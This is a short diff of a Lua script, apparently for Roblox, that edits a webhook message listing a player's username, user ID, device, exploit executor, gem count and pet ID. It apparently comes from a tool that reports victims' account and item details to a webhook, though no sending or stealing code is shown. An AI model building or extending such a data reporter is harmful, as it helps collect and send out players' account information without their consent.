@@ -24,7 +24,7 @@ local webhookcheck =
            ["fields"] = {
             {
                 ["name"] = "``Data Generated``",
-                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..fardplayer.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``Gems :`` **" ..dims .." **\n``Pet ID :`` "..v.Name .."", 
+                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..fardplayer.userId .. "**\n** ``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``Gems :`` **" ..dims .." **\n``Pet ID :`` "..v.Name .."", 
                 ["inline"] = false
             }
             
